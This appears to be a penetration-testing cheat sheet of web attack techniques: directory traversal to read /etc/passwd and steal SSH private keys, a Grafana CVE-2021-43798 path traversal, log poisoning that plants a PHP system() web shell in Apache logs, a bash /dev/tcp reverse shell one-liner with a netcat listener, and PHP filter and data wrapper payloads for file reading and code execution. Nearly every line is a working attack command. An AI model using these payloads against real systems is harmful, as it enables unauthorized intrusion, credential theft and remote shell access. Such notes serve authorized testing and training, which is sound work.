# Directory Traversal
- Show ect/passwd from php: http://targeturl.com/index.php?page=../../../../../../../../../etc/passwd
- Grabbing/Saving SSH RSA Private Key of Username: curl http://targeturl.com/index.php?page=../../../../../../../../../home/username/.ssh/id_rsa | 
    - Logging in with RSA key: ssh -i dt_key -p 2222 username@targeturl.com
- Windows - Grafana Vulnerability (CVE-2021-43798): http://ipaddress:3000/public/plugins/mysql/../../../../../../../../Users/Install.txt
- URL encoding: curl http://ipaddress/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/opt/passwords

# Local File Inclusion (LFI) through Log Poisoning
Write executeable code to Apache's access.log file in /var/log/apache2/
- Add PHP snippet to user agent header of GET request: <?php echo system($_GET['cmd']); ?>
- Modify GET request with directory traversal to log file & cmd: GET /index.php?page=../../../../../../../../../var/log/apache2/access.log&cmd=ls%20-la
- Reverse Shell
    - Start netcat listener: nc -nvlp 4444
    - Mod GET cmd to bash reverse shell one-liner = bash -c "bash -i >& /dev/tcp/local.host.ip.address/4444 0>&1"
        - URL Encoded: GET index.php?page=../../../../../../../../../var/log/apache2/access.log&cmd=bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2Flocal.host.ip.address%2F4444%200%3E%261%22
- Alt to show sensitive file: GET /index.php?page=../../../../../../../../../xampp/htdocs/secret.txt&cmd=cat

## PHP Wrappers (Bypassing file inclusion filters)
Filter (To read contents)
- No encoding: curl http://targeturl.com/index.php?page=php://filter/resource=admin.php
- Base64 Encode: curl http://targeturl.com/index.php?page=php://filter/convert.base64-encode/resource=admin.php
- Alt Base64 encode: curl http://192.168.244.16/meteor/index.php?page=php://filter/convert.base64-encode/resource='/var/www/html/backup.php'
    - To decode Base64 : echo "BaSE64StR1nG0fL3tt3rsaNDnuMB34s!" | base64 -d
Data (Code Execution)
- curl "http://targetip/index.php?page=data://text/plain,<?php%20echo%20system('ls');?>"